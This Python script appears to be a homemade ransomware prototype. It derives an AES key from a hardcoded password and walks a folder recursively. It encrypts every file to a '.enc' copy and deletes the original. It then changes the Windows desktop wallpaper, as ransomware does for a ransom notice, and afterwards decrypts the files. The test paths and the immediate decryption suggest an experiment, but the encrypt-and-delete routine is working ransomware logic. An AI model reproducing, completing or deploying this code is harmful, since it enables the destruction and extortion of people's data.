from Cryptodome.Cipher import AES
import os.path
import struct
import hashlib
import ctypes

IV_SIZE = 16    # 128 bit, fixed for the AES algorithm
KEY_SIZE = 32   # 256 bit meaning AES-256, can also be 128 or 192 bits
SALT_SIZE = 16  # This size is arbitrary

def enc_file(base, in_filename, out_filename, chunksize=64*1024):
    iv = base[0:IV_SIZE]
    key = base[IV_SIZE:]

    encryptor = AES.new(key, AES.MODE_CFB, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))

def search_enc(path):
    try:
        files = os.listdir(path)
        for file in files:
            filename = os.path.join(path, file)
            if(os.path.isdir(filename)):
                search_enc(filename)
            else:
                outfilename = filename + '.enc'
                enc_file(key, filename, outfilename, chunksize=64*1024)
                os.remove(filename)
    except PermissionError:
        pass

def dec_file(base, in_filename, out_filename=None, chunksize=24*1024):
    if not out_filename:
        out_filename = os.path.splitext(in_filename)[0]

    iv = base[0:IV_SIZE]
    key = base[IV_SIZE:]

    with open(in_filename, 'rb') as infile:
        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
        iv = infile.read(16)
        decryptor = AES.new(key, AES.MODE_CFB, iv)

        with open(out_filename, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))

            outfile.truncate(origsize)

def search_dec(path):
    try:
        files = os.listdir(path)
        for file in files:
            filename = os.path.join(path, file)
            if(os.path.isdir(filename)):
                search_dec(filename)
            else:
                fname, ext = os.path.splitext(filename)
                if (ext == '.enc'):
                    dec_file(key, filename)
                    os.remove(filename)
    except PermissionError:
        pass

def change_bg():
    dir = ''
    imagePath = 'C:/Users/tmdgh/Desktop/test.jpg'
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, imagePath, 3)


testPath = 'C:/Users/tmdgh/Desktop/test123/'

password = 'hwanlee'
password = password.encode()

salt = os.urandom(SALT_SIZE)
testsalt = b'0912'
base = hashlib.pbkdf2_hmac('sha256', password, testsalt, 100000, dklen=IV_SIZE + KEY_SIZE)
iv = base[0:IV_SIZE]
key = base[IV_SIZE:]

print("encoding")
search_enc(testPath)

change_bg()

print("decoding")
search_dec(testPath)